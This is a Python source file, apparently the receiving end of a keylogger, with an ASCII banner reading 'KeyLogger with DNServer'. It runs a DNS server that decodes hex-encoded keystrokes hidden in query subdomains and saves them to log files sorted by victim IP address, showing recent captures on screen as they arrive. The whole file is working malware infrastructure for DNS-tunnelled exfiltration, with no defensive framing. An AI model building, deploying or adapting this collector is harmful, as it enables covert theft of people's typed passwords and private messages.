###############################################################
# Imports
###############################################################
import socket
from dnslib import DNSRecord, QTYPE, RR, A
import os.path
import sys

###############################################################
# Vars. Global
###############################################################
# Verifico se foi passado a porta se
# não pega uma padrão para subir o server
if len(sys.argv) > 1:
    _PORT = int(sys.argv[1])
else:
    _PORT = 9953

_DNS_ADDR = ('0.0.0.0', _PORT)
_FAKE_DOMAIN = '.example.com.'
_LAST_REQUEST = []
_COR = {
        'limpa':'\033[m',
        'red':'\033[31m',
        'green':'\033[32m',
        'yellow':'\033[33m'
    }
_CONT = 0

###############################################################
# Classes e Funções
###############################################################
def treatments(data):
    '''
    Realiza o tratamento da string adicionando
    a acentuação corretamente nas palavras
    
    Args:
        data: str
    Return:
        data: str
    '''
    replacements = {
        '´a': 'á',
        '´e': 'é',
        '´i': 'í',
        '´o': 'ó',
        '´u': 'ú',
        '`a': 'à',
        '`e': 'è',
        '`i': 'ì',
        '`o': 'ò',
        '`u': 'ù',
        '^a': 'â',
        '^e': 'ê',
        '^i': 'î',
        '^o': 'ô',
        '^u': 'û',
        '~a': 'ã',
        '~o': 'õ',
    }

    for key, value in replacements.items():
        data = data.replace(key, value)

    return data

def write_on_file(path, arq_name, data):
    '''
    Grava tudo o que foi digitado em um arquivo
    no caminho especificado.

    Args:
        path:       str
        arq_name:   str
        data:       str

    Return:
        None
    '''
    path_name = os.path.join(path, arq_name)

    if os.path.isdir(path):
        with open(path_name, 'a') as file:
            file.write(data)
            file.close()
    else:
        os.mkdir(path)
        with open(path_name, 'a') as file:
            file.write(data)
            file.close()

def menu(addr=None, data=None):
    '''
    Printa o Menu na tela.

    Args:
        addr: str
        data: str

    Return:
        None
    '''
    global _LAST_REQUEST, _PORT

    if len(_LAST_REQUEST) <= 10 and data != None:
        _LAST_REQUEST.append(f'  {addr} | {data}')
    elif len(_LAST_REQUEST) >= 10:
        _LAST_REQUEST.pop(0)
        _LAST_REQUEST.append(f'  {addr} | {data}')

    request_string = ''.join(i for i in _LAST_REQUEST)

    os.system('cls')

    # Sei que a visualização por aqui fica ruim, porém no terminal fica lindo!
    print(f"""
,---,---,---,---,---,---,---,---,---,---,---,---,---,-------,
| " | 1 | 2 | 3 | 4 | 5 | 6 | 7 | 8 | 9 | 0 | - | + | <---  |   {_COR['red']}╦╔═{_COR['limpa']}┌─┐┬ ┬{_COR['red']}╦  {_COR['limpa']}┌─┐┌─┐┌─┐┌─┐┬─┐
|---'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-----|   {_COR['red']}╠╩╗{_COR['limpa']}├┤ └┬┘{_COR['red']}║  {_COR['limpa']}│ ││ ┬│ ┬├┤ ├┬┘ 
| ->| | Q | {_COR['red']}W{_COR['limpa']} | E | R | T | Y | U | I | O | P | ` | [ |     |   {_COR['red']}╩ ╩{_COR['limpa']}└─┘ ┴ {_COR['red']}╩═╝{_COR['limpa']}└─┘└─┘└─┘└─┘┴└─
|-----',--',--',--',--',--',--',--',--',--',--',--',--'     |   ┬ ┬┬┌┬┐┬ ┬  {_COR['red']}╔╦╗╔╗╔╔═╗{_COR['limpa']}┌─┐┬─┐┬  ┬┌─┐┬─┐
| Caps | {_COR['red']}A{_COR['limpa']} | {_COR['red']}S{_COR['limpa']} | {_COR['red']}D{_COR['limpa']} | F | G | H | J | K | L | Ç | ~ |  Enter |   ││││ │ ├─┤   {_COR['red']}║║║║║╚═╗{_COR['limpa']}├┤ ├┬┘└┐┌┘├┤ ├┬┘
|------'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'--------|   └┴┘┴ ┴ ┴ ┴  {_COR['red']}═╩╝╝╚╝╚═╝{_COR['limpa']}└─┘┴└─ └┘ └─┘┴└─
| Shift  | Z | X | C | V | B | N | M | < | > | ; |   Shift  |
|------,-',--'--,'---'---'---'---'---'---'-,-'---',--,------|   [Aceitando requisições na porta {_COR['green']}{_PORT}{_COR['limpa']}]
| ctrl |  | alt |                          | alt  |  | ctrl |   [Requisições em tempo real]
'------'--'-----'--------------------------'------'--'------'

{request_string}""")



def start_dns_server():
    global _CONT
    # Cria um socket para ouvir requisições DNS
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(_DNS_ADDR)

    if os.path.isdir('logs'):
        pass
    else:
        os.mkdir('logs')
    
    menu()
    
    while True:
        try:
            data, addr = sock.recvfrom(512)
            _CONT += 1

            # Formando o path/pasta para cada cliente
            path = os.path.join('logs', str(addr[0]))
            
            # Lê a requisição DNS
            request = DNSRecord.parse(data)
            data = str(request.q.qname)
            data = data.replace(_FAKE_DOMAIN, '')
            
            # Decodifica os dados do domínio
            data = ''.join([chr(int(data[i:i+2], 16)) for i in range(0, len(data), 2)])
            
            # Daqui pra baixo passar para uma thread futuramente
            arc_name, data = (data[:3] + '.txt'), data[3:]

            if _CONT == 2:
                data = treatments(data) + '\n'
                _CONT = 0
            else:
                data = treatments(data)

            menu(addr, data)
            write_on_file(path, arc_name, data)            
            
            # Criando um objeto DNSRecord para a resposta
            dns_response = DNSRecord()
            # Adicionando uma resposta DNS
            dns_response.add_answer(RR(_FAKE_DOMAIN[1:], QTYPE.A, rdata=A('127.0.0.1')))
            # Convertendo a resposta para uma representação de bytes
            response_bytes = dns_response.pack()
            #print(response_bytes.hex())  # Exibindo a resposta em hexadecimal

            #time.sleep(8)
            # Envia a resposta DNS de volta para o cliente
            sock.sendto(response_bytes, addr)

        except Exception as e:
            print(e)


###############################################################
# Main
###############################################################
if __name__ == "__main__":
    start_dns_server()
